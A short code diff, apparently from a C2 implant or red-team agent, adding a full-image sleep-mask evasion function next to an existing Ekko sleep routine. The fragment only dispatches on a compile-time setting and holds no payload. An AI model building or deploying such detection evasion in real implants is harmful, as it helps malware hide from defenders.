@@ -129,6 +129,14 @@ auto declfn evasion_post_sleep( instance& inst ) -> void {
     mask_post_sleep( inst );
 }
 
+auto declfn evasion_full_image_sleep( instance& inst, uint32_t sleep_ms ) -> void {
+#if SLEEP_MASK_TYPE == MASK_FULL_IMAGE
+    fi_sleep( inst, sleep_ms );
+#else
+    (void)inst; (void)sleep_ms;
+#endif
+}
+
 auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 #if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
     if ( inst.evasion.ekko.initialized ) {
